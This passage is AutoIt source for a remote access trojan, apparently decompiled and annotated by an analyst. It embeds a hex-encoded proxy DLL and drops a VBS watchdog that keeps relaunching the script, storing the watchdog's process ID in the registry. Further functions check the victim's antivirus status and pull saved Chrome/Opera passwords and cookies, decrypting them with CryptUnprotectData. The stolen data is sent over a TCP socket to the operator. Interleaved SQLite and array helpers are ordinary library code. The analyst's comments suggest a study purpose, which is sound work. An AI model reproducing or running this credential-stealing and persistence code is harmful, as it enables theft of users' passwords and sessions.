7402EB07B801000000EB0231C021C0740431C0EB4D8D84241001000050687F660440FFB42428010000E8270600008984240C0100008B9C240C01000021DB7407B804000000EB1B8B9C241001000021DB7507B804000000EB09B802000000EB0231C081C4140100005B5DC204005331C050505050E8BE0500008944240CFF742418E8DAFEFFFF890424833C24007470FF3424BB020000003B1C24754F68000000008B5C24282B5C2410538B5C2428035C241453FF742428E89F050000894424088B5C240C035C2408895C240C8B5C240C3B5C2424750AB80100000083C404EB47E85205000089442410EB11BB040000003B1C24750731C083C404EB2B58EB21E83305000089C32B5C240C81FB102700007E0431C0EB116801000000E81D050000E958FFFFFF31C083C4105BC20C0055538B6C24108B5D0083FB407D2BFF74240C8B6C2414558B6C24188B4500C1E0025D01C5588945048B6C24108B5D0043538B6C24145889450031C05B5DC208005553BA4900000083EC04C70424000000004A75F3C784241C01000000C8C71EC784242001000000C9C71E8BAC24300100000FB74505508BAC24340100008D450750E84F0300008904248B1C2483FB017D0C6864000000E874040000EB02EB02EBC98BAC24300100"
    $PlugReVer &= "00807D0000746768040000008D84242401000050FF742408E8BCFCFFFF68060100008D44240C50FF742408E868FEFFFF8D6C24080FB74500508D450250E8EC020000894424048B5C240421DB7E08C68424140100000168010000008D84241801000050FF742408E86DFCFFFFEB1668040000008D84242001000050FF742408E855FCFFFFC784241001000000000000FF3424E8F4FCFFFF50BB020000003B1C240F85250200008BAC2434010000807D00000F840101000068040000008D84241801000050FF74240CE8CBFDFFFF8B9C241401000083FBFF0F85A2000000C784241401000000000000FF742408E89AFCFFFF50BB020000003B1C247556680000000068000001008BAC2440010000FF7501FF742418E86D0300008984241801000068040000008D84241C01000050FF742410E8A3FBFFFFFFB424180100008BAC243C010000FF7501FF742410E889FBFFFFEB2ABB040000003B1C24750A83C408E991010000EB1668040000008D84241C01000050FF742410E85DFBFFFF58EB34FFB424140100008BAC2438010000FF7501FF74240CE8FFFCFFFFFFB424140100008BAC2438010000FF7501FF742410E826FBFFFFE911010000C684241801000001680000000068010000008D84242001000050FF742410E8AB020000898424140100000FBE9C241801000083FB01750883C404E9FE000000680B0101006840000000E8440200008984241C01000083BC241C010000000F84980000008B9C241C01000081C30B010000538BAC2420010000588945018BAC24340100008D4507508BAC24200100008D450750E8010200008BAC24340100000FB74505508BAC242001000058668945058BAC241C010000C645000168000000006800000000FFB424240100008D05691300105068001000006800000000E8BD01000021C0740AC684241801000001EB0CFFB4241C010000E8A901000068010000008D84241C01000050FF74240CE810FAFFFFEB0FBB040000003B1C24750583C404EB1B588B9C241001000021DB750A680A000000E878010000E98FFDFFFF8B5C240421DB7E09FF742404E8860100008B1C2421DB7E08FF3424E877010000FFB42430010000E83B01000031C081C4240100005B5DC204005553BA0700000083EC04C70424000000004A75F38D2C2466C745000200FF74242CE83E010000508D6C24045866894502FF742428E831010000508D6C2404588945048B5D0483FBFF753EFF742428E81D010000894424148B5C241421DB7502EB778B6C2414FF750C58894424108B6C2410FF750058894424108B6C2410FF75008D6C240458894504680600000068010000006802000000E8DA000000894424188B5C241883FBFF7502EB2D68100000008D44240450FF742420E8"
    $PlugReVer &= "BE00000089C383FBFF750BFF742418E890000000EB088B442418EB0231C083C41C5B5DC2080053BA6400000083EC04C70424000000004A75F38D0424506802020000E88100000089C321DB7507B801000000EB0231C0EB0231C081C4900100005BC3FF258C300010FF2590300010FF2594300010FF2598300010FF259C300010FF25A0300010FF25A8300010FF25AC300010FF25B0300010FF25B4300010FF25B8300010FF25BC300010FF25C0300010FF25C4300010FF25C8300010FF25CC300010FF25D0300010FF25D4300010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005992DC590000000032200000010000000100000001000000282000002C200000302000002B100000402000000000626573744F664273742E646C6C0050726F7879436C69656E745F53746172740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    $PlugReVer &= "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003C30000000000000000000002C3100008C300000583000000000000000000000C6310000A83000000000000000000000000000000000000000000000DC300000EA300000F6300000063100001431000024310000000000003A310000423100004C3100005C3100006A31000072310000803100008831000094310000A4310000AE310000B831000000000000DC300000EA300000F6300000063100001431000024310000000000003A310000423100004C3100005C3100006A31000072310000803100008831000094310000A4310000AE310000B8310000000000008A02476C6F62616C416C6C6F6300B9046C737472637079410000A40043726561746554687265616400009102476C6F62616C4672656500006A024765745469636B436F756E7400002B04536C656570004B45524E454C33322E646C6C0000000073656E640000000073656C656374000000005F5F5753414644497353657400000000696F63746C736F636B65740000007265637600000000636C6F7365736F636B657400000068746F6E73000000696E65745F61646472000000676574686F737462796E616D65000000736F636B657400000000636F6E6E65637400000057534153746172747570000057534F434B33322E444C4C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000030000000773055361C38223828382E3834383A38403846384C38523858385E3864386A38703876387C3882380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    $PlugReVer &= "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    Return $PlugReVer
EndFunc

Func ProxyClient_Start($client_ip, $port)
    Local $icall = DllCall($proxy_dll, "long", "ProxyClient_Start", "str", $client_ip, "USHORT", $port)
    If Not @error Then Return $icall[0]
EndFunc

#CS -- HTC --
This function return the VBS string:
"strComputer = "."
Dim objShell
Set objShell = CreateObject("WScript.Shell")
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
while 1
IF isProcessRunning(strComputer,strProcess) THEN
ELSE
objShell.Run fileset
END IF
Wend
FUNCTION isProcessRunning(BYVAL strComputer,BYVAL strProcessName)
DIM objWMIService, strWMIQuery
strWMIQuery = "Select * from Win32_Process where name like '" & strProcessName & "'"
SET objWMIService = GETOBJECT("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" _
& strComputer & "\root\cimv2")
IF objWMIService.ExecQuery(strWMIQuery).Count > 0 THEN
isProcessRunning = TRUE
ELSE
isProcessRunning = FALSE
END IF
END FUNCTION"
#CE
Func Get_VBS_String()
    Global $hexstr = "0x"
    $hexstr &= "737472436F6D7075746572203D20222E22200D0A44696D206F626A5368656C6C0D0A536574206F626A5368656C6C203D204372656174654F626A6563742822575363726970742E5368656C6C22290D0A44696D2066736F0D0A5365742066736F203D204372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422290D0A7768696C6520310D0A494620697350726F6365737352756E6E696E6728737472436F6D70757465722C73747250726F6365737329205448454E0D0A454C53450D0A6F626A5368656C6C2E52756E2066696C657365740D0A454E442049460D0A57656E640D0A46554E4354494F4E20697350726F6365737352756E6E696E6728425956414C20737472436F6D70757465722C425956414C2073747250726F636573734E616D65290D0A44494D206F626A574D49536572766963652C20737472574D4951756572790D0A737472574D495175657279203D202253656C656374202A2066726F6D2057696E33325F50726F63657373207768657265206E616D65206C696B6520272220262073747250726F636573734E616D652026202227220D0A534554206F626A574D4953657276696365203D204745544F424A454354282277696E6D676D74733A22205F0D0A2620227B696D706572736F6E6174696F6E4C6576656C3D696D706572736F6E6174657D215C5C22205F200D0A2620737472436F6D7075746572202620225C726F6F745C63696D7632222920090D0A4946206F626A574D49536572766963652E45786563517565727928737472574D495175657279292E436F756E74203E2030205448454E0D0A697350726F6365737352756E6E696E67203D20545255450D0A454C53450D0A697350726F6365737352756E6E696E67203D2046414C53450D0A454E442049460D0A454E442046554E4354494F4E"
    Return BinaryToString($hexstr)
EndFunc

Func Write_VBS_To_File()
    $strs = '"'
    $dannca12a = $strs & $strs & $strs
    $filesssVBS = @TempDir & "\FHEWYW.vbs"
    If Not FileExists($filesssVBS) Then
        $hfile = FileOpen($filesssVBS, 2)
        FileWrite($hfile, "On error resume next" & @CRLF)
        FileWrite($hfile, "Dim strComputer, strProcess, fileset" & @CRLF)
        FileWrite($hfile, "strProcess = " & $strs & @ScriptName & $strs & @CRLF)
        FileWrite($hfile, "fileset = " & $dannca12a & @ScriptFullPath & $dannca12a & @CRLF)
        FileWrite($hfile, Get_VBS_String())
        FileClose($hfile)
    EndIf
EndFunc

Func Run_VBS()
    Local $era = RegRead("HKCU\Software\Win32", "FHEWYW")
    If Not ProcessExists($era) Then
        Write_VBS_To_File()
        $vboui = Run("WSCript " & @TempDir & "\FHEWYW.vbs", @TempDir)
        RegWrite("HKCU\Software\Win32", "FHEWYW", "REG_SZ", $vboui)
    EndIf
EndFunc

Func _FilePrint($s_file, $i_show = @SW_HIDE)
    Local $a_ret = DllCall("shell32.dll", "int", "ShellExecuteW", "hwnd", 0, "wstr", "print", "wstr", $s_file, "wstr", "", "wstr", "", "int", $i_show)
    If @error Then Return SetError(@error, @extended, 0)
    If $a_ret[0] <= 32 Then Return SetError(10, $a_ret[0], 0)
    Return 1
EndFunc

Func WINSTAX($DAQDA, $WISTTA)
    Local $RRAVYSS = BitAND(WinGetState($DAQDA), $WISTTA)
    Return ($RRAVYSS)
EndFunc

Func MONOPRI()
    $MGLOG = "0"
    If FileExists($mons) Then
        $NLS = _filelisttoarray($mons, "*", 2)
        If IsArray($NLS) Then
            $MGLOG = $NLS[0]
        Else
            $MGLOG = "0"
        EndIf
    EndIf
    Return $MGLOG
EndFunc

Func _arrayconcatenate(ByRef $avArrayTarget, Const ByRef $avArraySource, $istart = 0)
    If Not IsArray($avArrayTarget) Then Return SetError(1, 0, 0)
    If Not IsArray($avArraySource) Then Return SetError(2, 0, 0)
    If UBound($avArrayTarget, 0) <> 1 Then
        If UBound($avArraySource, 0) <> 1 Then Return SetError(5, 0, 0)
        Return SetError(3, 0, 0)
    EndIf
    If UBound($avArraySource, 0) <> 1 Then Return SetError(4, 0, 0)
    Local $iUBoundTarget = UBound($avArrayTarget) - $istart, $iUBoundSource = UBound($avArraySource)
    ReDim $avArrayTarget[$iUBoundTarget + $iUBoundSource]
    For $i = $istart To $iUBoundSource - 1
        $avArrayTarget[$iUBoundTarget + $i] = $avArraySource[$i]
    Next
    Return $iUBoundTarget + $iUBoundSource
EndFunc

; Get name from an IP
Func _TcpIpToName($sIP, $iOption = Default, $hDll_Ws2_32 = Default)
    Local $INADDR_NONE = -1, $AF_INET = 2, $sseparator = @CR
    If $iOption = Default Then $iOption = 0
    If $hDll_Ws2_32 = Default Then $hDll_Ws2_32 = "Ws2_32.dll"
    Local $vaDllCall = DllCall($hDll_Ws2_32, "ulong", "inet_addr", "str", $sIP)
    If @error Then Return SetError(1, 0, "")
    Local $vBInIP = $vaDllCall[0]
    If $vBInIP = $INADDR_NONE Then Return SetError(2, 0, "")
    $vaDllCall = DllCall($hDll_Ws2_32, "ptr", "gethostbyaddr", "ptr*", $vBInIP, "int", 4, "int", $AF_INET)
    If @error Then Return SetError(3, 0, "")
    Local $vPtrHostent = $vaDllCall[0]
    If $vPtrHostent = 0 Then
        $vaDllCall = DllCall($hDll_Ws2_32, "int", "WSAGetLastError")
        If @error Then Return SetError(5, 0, "")
        Return SetError(4, $vaDllCall[0], "")
    EndIf
    Local $vHostent = DllStructCreate("ptr;ptr;short;short;ptr", $vPtrHostent)
    Local $sHostNames = __TcpIpToName_szStringRead(DllStructGetData($vHostent, 1))
    If @error Then Return SetError(6, 0, $sHostNames)
    If $iOption = 1 Then
        Local $vHostent
        $sHostNames &= $sseparator
        For $i = 0 To 63
            $vHostent = DllStructCreate("ptr", DllStructGetData($vHostent, 2) + ($i * 4))
            If DllStructGetData($vHostent, 1) = 0 Then ExitLoop
            $sHostNames &= __TcpIpToName_szStringRead(DllStructGetData($vHostent, 1))
            If @error Then
                SetError(7)
                ExitLoop
            EndIf
        Next
        Return StringSplit(StringStripWS($sHostNames, 2), @CR)
    Else
        Return $sHostNames
    EndIf
EndFunc

Func __TcpIpToName_szStringRead($iszPtr, $iLen = -1)
    Local $astrLen, $vszString
    If $iszPtr < 1 Then Return ""
    If $iLen < 0 Then
        $astrLen = DllCall("msvcrt.dll", "ulong_ptr:cdecl", "strlen", "ptr", $iszPtr)
        If @error Then Return SetError(1, 0, "")
        $iLen = $astrLen[0] + 1
    EndIf
    $vszString = DllStructCreate("char[" & $iLen & "]", $iszPtr)
    If @error Then Return SetError(2, 0, "")
    Return SetExtended($iLen, DllStructGetData($vszString, 1))
EndFunc

Func _ReplaceStringInFile($szFileName, $szSearchString, $szReplaceString, $fCaseness = 0, $fOccurance = 1)
    Local $iRetVal = 0
    Local $nCount, $sEndswith
    If StringInStr(FileGetAttrib($szFileName), "R") Then Return SetError(6, 0, -1)
    Local $hfile = FileOpen($szFileName, $FO_READ)
    If $hfile = -1 Then Return SetError(1, 0, -1)
    Local $s_totFile = FileRead($hfile, FileGetSize($szFileName))
    If StringRight($s_totFile, 2) = @CRLF Then
        $sEndswith = @CRLF
    ElseIf StringRight($s_totFile, 1) = @CR Then
        $sEndswith = @CR
    ElseIf StringRight($s_totFile, 1) = @LF Then
        $sEndswith = @LF
    Else
        $sEndswith = ""
    EndIf
    Local $aFileLines = StringSplit(StringStripCR($s_totFile), @LF)
    FileClose($hfile)
    Local $iEncoding = FileGetEncoding($szFileName)
    Local $hWriteHandle = FileOpen($szFileName, $iEncoding + $FO_OVERWRITE)
    If $hWriteHandle = -1 Then Return SetError(2, 0, -1)
    For $nCount = 1 To $aFileLines[0]
        If StringInStr($aFileLines[$nCount], $szSearchString, $fCaseness) Then
            $aFileLines[$nCount] = StringReplace($aFileLines[$nCount], $szSearchString, $szReplaceString, 1 - $fOccurance, $fCaseness)
            $iRetVal = $iRetVal + 1
            If $fOccurance = 0 Then
                $iRetVal = 1
                ExitLoop
            EndIf
        EndIf
    Next
    For $nCount = 1 To $aFileLines[0] - 1
        If FileWriteLine($hWriteHandle, $aFileLines[$nCount]) = 0 Then
            FileClose($hWriteHandle)
            Return SetError(3, 0, -1)
        EndIf
    Next
    If $aFileLines[$nCount] <> "" Then FileWrite($hWriteHandle, $aFileLines[$nCount] & $sEndswith)
    FileClose($hWriteHandle)
    Return $iRetVal
EndFunc

Func _ShellExecuteWithReducedPrivileges($spath, $sCMD = "", $sFolder = "", $sVerb = "", $iShowFlag = @SW_SHOWNORMAL, $bWait = False)
    Local $oShell, $oWebBrowser, $oIShellDispatch
    If Not IsAdmin() Or StringRegExp(@OSVersion, "_(XP|200(0|3))") Then
        Local $iret
        If $bWait Then
            $iret = ShellExecuteWait($spath, $sCMD, $sFolder, $sVerb, $iShowFlag)
        Else
            $iret = ShellExecute($spath, $sCMD, $sFolder, $sVerb, $iShowFlag)
        EndIf
        Return SetError(@error, @extended, $iret)
    EndIf
    $oShell = ObjCreate("shell.application")
    If Not IsObj($oShell) Then Return SetError(2, 0, 0)
    $oWebBrowser = $oShell.Windows.FindWindowSW(0, 0, 8, 0, 1)
    If Not IsObj($oWebBrowser) Then Return SetError(3, 0, 0)
    $oIShellDispatch = $oWebBrowser.Document.Application
    If Not IsObj($oIShellDispatch) Then Return SetError(4, 0, 0)
    $oIShellDispatch.ShellExecute($spath, $sCMD, $sFolder, $sVerb, $iShowFlag)
    Return 1
EndFunc

; Return the status of AV installed in victim machine - HTC
Func _GetAV()
    Dim $lArray8[2]
    $lArray8[0] = "x"
    $lArray8[1] = "x"
    Local $oWMI = ObjGet("winmgmts:\\localhost\root\SecurityCenter2")
    If IsObj($oWMI) Then
        Local $colItems = $oWMI.ExecQuery("Select * from AntiVirusProduct")
        If Not IsObj($colItems) Then Return 0
        For $objAntiVirusProduct In $colItems
            $lArray8[0] = $objAntiVirusProduct.displayName
            $lArray8[1] = $objAntiVirusProduct.productstate
        Next
        Dim $avStatus8 = Hex($lArray8[1])
        If StringMid($avStatus8, 5, 2) = "10" Or StringMid($avStatus8, 5, 2) = "11" Then
            $lArray8[1] = "Enabled"
        Else
            $lArray8[1] = "Disabled"
        EndIf
        If $lArray8[0] = "" Then
            $lArray8[0] = "No"
            $lArray8[1] = "No"
        EndIf
    EndIf
    Return $lArray8
EndFunc

Func _Get_Chrome_Opera_Password()
    If FileExists($PasswordDb) Then
        $tempPasswordDb = @TempDir & "\dbsq2.db"
        FileDelete($tempPasswordDb)
        FileCopy($PasswordDb, $tempPasswordDb, 1)
        _sqlite_create_dll()
        Local $aresults, $irows, $icolumns
        _sqlite_startup($SQLite3DLL)
        $hdb = _sqlite_open($tempPasswordDb)
        $iret = _sqlite_gettable2d(-1, "SELECT * FROM logins;", $aresults, $irows, $icolumns)
        If $iret = $sqlite_ok Then
            If IsArray($aresults) Then
                $sSiteUserPwd = ""
                For $io = 1 To UBound($aresults, 1) - 1 Step +1
                    #CS - HTC -
                    Site = aresults[io][1]
                    User = aresults[io][3]
                    Password = aresults[io][5]
                    #CE
                    $sPwd = UncryptRDPPassword($aresults[$io][5])
                    If $sPwd <> "" And $aresults[$io][3] <> "" And $aresults[$io][1] <> "" Then
                        $sSiteUserPwd &= $aresults[$io][1] & "|#" & $aresults[$io][3] & "|#" & $sPwd & "|@"
                    EndIf
                Next
                If $g_getAllPwds = 1 Then
                    $sReult = $sSiteUserPwd
                    Return $sReult
                Else
                    TCPSend($mainSocket, StringTrimRight($sSiteUserPwd, 2))
                    TCPSend($mainSocket, "logdoxets")
                EndIf
                $sSiteUserPwd = ""
            EndIf
        EndIf
        _sqlite_close($hdb)
        _sqlite_shutdown()
    EndIf
EndFunc

Func _Get_Chrome_Opera_Cookies()
    If FileExists($mainCookiesDb) Then
        $tempCookiesDb = @TempDir & "\dbsq.db"
        FileDelete($tempCookiesDb)
        FileCopy($mainCookiesDb, $tempCookiesDb, 1)
        _sqlite_create_dll()
        Local $aresults, $irows, $icolumns
        _sqlite_startup($SQLite3DLL)
        $hdb = _sqlite_open($tempCookiesDb)
        $irval = _sqlite_gettable2d(-1, "SELECT * FROM cookies;", $aresults, $irows, $icolumns)
        If $irval = $sqlite_ok Then
            If IsArray($aresults) Then
                $sCookies = ""
                For $ii = 1 To UBound($aresults, 1) - 1 Step +1
                    $sUnknown_HTC = $aresults[$ii][1]
                    $sCookies &= $sUnknown_HTC & "[[#" & $aresults[$ii][2] & "[[#" & UncryptRDPPassword($aresults[$ii][12]) & "[[#" & $aresults[$ii][4] & "[[#" & $aresults[$ii][6] & "[[#" & $aresults[$ii][7] & "@#@"
                Next
                TCPSend($mainSocket, $sCookies)
                TCPSend($mainSocket, "Stealdonex")
            EndIf
        EndIf
        _sqlite_close($hdb)
        _sqlite_shutdown()
    EndIf
EndFunc

; HTC - Not in pastebin, manual name
Func _sqlite_create_dll()
    If Not FileExists($SQLite3DLL) Then
        $hDll = FileOpen($SQLite3DLL, 18)
        FileWrite($hDll, _sqlite3_dll_data())
        FileClose($hDll)
        Sleep(1000)
    EndIf
EndFunc

Func UncryptRDPPassword($bin)
    Local Const $CRYPTPROTECT_UI_FORBIDDEN = 1
    Local Const $DATA_BLOB = "int;ptr"
    Local $passStr = DllStructCreate("byte[1024]")
    Local $DataIn = DllStructCreate($DATA_BLOB)
    Local $DataOut = DllStructCreate($DATA_BLOB)
    $pwDescription = "psw"
    $PwdHash = ""
    DllStructSetData($DataOut, 1, 0)
    DllStructSetData($DataOut, 2, 0)
    DllStructSetData($passStr, 1, $bin)
    DllStructSetData($DataIn, 2, DllStructGetPtr($passStr, 1))
    DllStructSetData($DataIn, 1, BinaryLen($bin))
    $tData = DllCall("crypt32.dll", "int", "CryptUnprotectData", "ptr", DllStructGetPtr($DataIn), "ptr", 0, "ptr", 0, "ptr", 0, "ptr", 0, "dword", $CRYPTPROTECT_UI_FORBIDDEN, "ptr", DllStructGetPtr($DataOut))
    If @error Then Return ""
    $len = DllStructGetData($DataOut, 1)
    $PwdHash = Ptr(DllStructGetData($DataOut, 2))
    $PwdHash = DllStructCreate("byte[" & $len & "]", $PwdHash)
    Return BinaryToString(DllStructGetData($PwdHash, 1), 4)
EndFunc

Func _arraydelete(ByRef $avarray, $ielement)
    If Not IsArray($avarray) Then Return SetError(1, 0, 0)
    Local $iubound = UBound($avarray, 1) - 1
    If Not $iubound Then
        $avarray = ""
        Return 0
    EndIf
    If $ielement < 0 Then $ielement = 0
    If $ielement > $iubound Then $ielement = $iubound
    Switch UBound($avarray, 0)
        Case 1
            For $i = $ielement To $iubound - 1
                $avarray[$i] = $avarray[$i + 1]
            Next
            ReDim $avarray[$iubound]
        Case 2
            Local $isubmax = UBound($avarray, 2) - 1
            For $i = $ielement To $iubound - 1
                For $j = 0 To $isubmax
                    $avarray[$i][$j] = $avarray[$i + 1][$j]
                Next
            Next
            ReDim $avarray[$iubound][$isubmax + 1]
        Case Else
            Return SetError(3, 0, 0)
    EndSwitch
    Return $iubound
EndFunc

Func _arraysearch(Const ByRef $avarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $iforward = 1, $isubitem = -1)
    If Not IsArray($avarray) Then Return SetError(1, 0, -1)
    If UBound($avarray, 0) > 2 Or UBound($avarray, 0) < 1 Then Return SetError(2, 0, -1)
    Local $iubound = UBound($avarray) - 1
    If $iend < 1 Or $iend > $iubound Then $iend = $iubound
    If $istart < 0 Then $istart = 0
    If $istart > $iend Then Return SetError(4, 0, -1)
    Local $istep = 1
    If Not $iforward Then
        Local $itmp = $istart
        $istart = $iend
        $iend = $itmp
        $istep = -1
    EndIf
    Local $icomptype = False
    If $icompare = 2 Then
        $icompare = 0
        $icomptype = True
    EndIf
    Switch UBound($avarray, 0)
        Case 1
            If Not $icompare Then
                If Not $icase Then
                    For $i = $istart To $iend Step $istep
                        If $icomptype And VarGetType($avarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
                        If $avarray[$i] = $vvalue Then Return $i
                    Next
                Else
                    For $i = $istart To $iend Step $istep
                        If $icomptype And VarGetType($avarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
                        If $avarray[$i] == $vvalue Then Return $i
                    Next
                EndIf
            Else
                For $i = $istart To $iend Step $istep
                    If StringInStr($avarray[$i], $vvalue, $icase) > 0 Then Return $i
                Next
            EndIf
        Case 2
            Local $iuboundsub = UBound($avarray, 2) - 1
            If $isubitem > $iuboundsub Then $isubitem = $iuboundsub
            If $isubitem < 0 Then
                $isubitem = 0
            Else
                $iuboundsub = $isubitem
            EndIf
            For $j = $isubitem To $iuboundsub
                If Not $icompare Then
                    If Not $icase Then
                        For $i = $istart To $iend Step $istep
                            If $icomptype And VarGetType($avarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
                            If $avarray[$i][$j] = $vvalue Then Return $i
                        Next
                    Else
                        For $i = $istart To $iend Step $istep
                            If $icomptype And VarGetType($avarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
                            If $avarray[$i][$j] == $vvalue Then Return $i
                        Next
                    EndIf
                Else
                    For $i = $istart To $iend Step $istep
                        If StringInStr($avarray[$i][$j], $vvalue, $icase) > 0 Then Return $i
                    Next
                EndIf
            Next
        Case Else
            Return SetError(7, 0, -1)
    EndSwitch
    Return SetError(6, 0, -1)
EndFunc

Func _tempfile($s_directoryname = @TempDir, $s_fileprefix = "~", $s_fileextension = ".tmp", $i_randomlength = 7)
    If IsKeyword($s_fileprefix) Then $s_fileprefix = "~"
    If IsKeyword($s_fileextension) Then $s_fileextension = ".tmp"
    If IsKeyword($i_randomlength) Then $i_randomlength = 7
    If Not FileExists($s_directoryname) Then $s_directoryname = @TempDir
    If Not FileExists($s_directoryname) Then $s_directoryname = @ScriptDir
    If StringRight($s_directoryname, 1) <> "\" Then $s_directoryname = $s_directoryname & "\"
    Local $s_tempname
    Do
        $s_tempname = ""
        While StringLen($s_tempname) < $i_randomlength
            $s_tempname = $s_tempname & Chr(Random(97, 122, 1))
        WEnd
        $s_tempname = $s_directoryname & $s_fileprefix & $s_tempname & $s_fileextension
    Until Not FileExists($s_tempname)
    Return $s_tempname
EndFunc

Func _sqlite_startup($sdll_filename = "", $butf8errormsg = False, $bforcelocal = 0, $sprintcallback = $g_sprintcallback_sqlite)
    $g_sprintcallback_sqlite = $sprintcallback
    If IsKeyword($butf8errormsg) Then $butf8errormsg = False
    $g_butf8errormsg_sqlite = $butf8errormsg
    If IsKeyword($sdll_filename) Or $bforcelocal Or $sdll_filename = "" Or $sdll_filename = -1 Then
        Local $bDownLoadDll = True
        Local $vInlineVersion = Call("__SQLite_Inline_Version")
        If $bforcelocal Then
            If @AutoItX64 And StringInStr($sdll_filename, "_x64") Then $sdll_filename = StringReplace($sdll_filename, ".dll", "_x64.dll")
            $bDownLoadDll = ($bforcelocal < 0)
        Else
            If @AutoItX64 = 0 Then
                $sdll_filename = "sqlite3.dll"
            Else
                $sdll_filename = "sqlite3_x64.dll"
            EndIf
            If @error Then $bDownLoadDll = False
            If __sqlite_verscmp(@ScriptDir & "\" & $sdll_filename, $vInlineVersion) = $sqlite_ok Then
                $sdll_filename = @ScriptDir & "\" & $sdll_filename
                $bDownLoadDll = False
            ElseIf __sqlite_verscmp(@SystemDir & "\" & $sdll_filename, $vInlineVersion) = $sqlite_ok Then
                $sdll_filename = @SystemDir & "\" & $sdll_filename
                $bDownLoadDll = False
            ElseIf __sqlite_verscmp(@WindowsDir & "\" & $sdll_filename, $vInlineVersion) = $sqlite_ok Then
                $sdll_filename = @WindowsDir & "\" & $sdll_filename
                $bDownLoadDll = False
            ElseIf __sqlite_verscmp(@WorkingDir & "\" & $sdll_filename, $vInlineVersion) = $sqlite_ok Then
                $sdll_filename = @WorkingDir & "\" & $sdll_filename
                $bDownLoadDll = False
            EndIf
        EndIf
        If $bDownLoadDll Then
            If FileExists($sdll_filename) Or $sdll_filename = "" Then
                $sdll_filename = _tempfile(@TempDir, "~", ".dll")
                _arrayadd($__gatempfiles_sqlite, $sdll_filename)
                OnAutoItExitRegister("_sqlite_shutdown")
            Else
                $sdll_filename = @SystemDir & "\" & $sdll_filename
            EndIf
            If $bforcelocal Then
                $vInlineVersion = ""
            Else
                $vInlineVersion = "_" & $vInlineVersion
            EndIf
            __sqlite_download_sqlite3dll($sdll_filename, $vInlineVersion)
        EndIf
    EndIf
    Local $S1AS0XE1GC8D3BJ8KF7EL6J = DllOpen($sdll_filename)
    If $S1AS0XE1GC8D3BJ8KF7EL6J = -1 Then
        $g_hdll_sqlite = 0
        Return SetError(1, 0, "")
    Else
        $g_hdll_sqlite = $S1AS0XE1GC8D3BJ8KF7EL6J
        Return $sdll_filename
    EndIf
EndFunc

Func _sqlite_shutdown()
    If $g_hdll_sqlite > 0 Then DllClose($g_hdll_sqlite)
    $g_hdll_sqlite = 0
    If $__ghmsvcrtdll_sqlite > 0 Then DllClose($__ghmsvcrtdll_sqlite)
    $__ghmsvcrtdll_sqlite = 0
    For $stempfile In $__gatempfiles_sqlite
        If FileExists($stempfile) Then FileDelete($stempfile)
    Next
    OnAutoItExitUnRegister("_sqlite_shutdown")
EndFunc

Func _sqlite_open($sdatabase_filename = Default, $iaccessmode = Default, $iEncoding = Default)
    If Not $g_hdll_sqlite Then Return SetError(3, $sqlite_misuse, 0)
    If IsKeyword($sdatabase_filename) Or Not IsString($sdatabase_filename) Then $sdatabase_filename = ":memory:"
    Local $tfilename = __sqlite_stringtoutf8struct($sdatabase_filename)
    If @error Then Return SetError(2, @error, 0)
    If IsKeyword($iaccessmode) Then $iaccessmode = BitOR($sqlite_open_readwrite, $sqlite_open_create)
    Local $oldbase = FileExists($sdatabase_filename)
    If IsKeyword($iEncoding) Then
        $iEncoding = $sqlite_encoding_utf8
    EndIf
    Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_open_v2", "struct*", $tfilename, "long*", 0, "int", $iaccessmode, "ptr", 0)
    If @error Then Return SetError(1, @error, 0)
    If $avrval[0] <> $sqlite_ok Then
        __sqlite_reporterror($avrval[2], "_sqlite_open")
        _sqlite_close($avrval[2])
        Return SetError(-1, $avrval[0], 0)
    EndIf
    $g_hdb_sqlite = $avrval[2]
    __sqlite_hadd($__ghdbs_sqlite, $avrval[2])
    If Not $oldbase Then
        Local $encoding[3] = ["8", "16", "16be"]
        _sqlite_exec($avrval[2], 'PRAGMA encoding="UTF-' & $encoding[$iEncoding] & '";')
    EndIf
    Return SetExtended($avrval[0], $avrval[2])
EndFunc

Func _sqlite_exec($hdb, $ssql, $scallback = "")
    If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
    If $scallback <> "" Then
        Local $irows, $icolumns
        Local $aresult = "SQLITE_CALLBACK:" & $scallback
        Local $irval = _sqlite_gettable2d($hdb, $ssql, $aresult, $irows, $icolumns)
        If @error Then Return SetError(3, @error, $irval)
        Return $irval
    EndIf
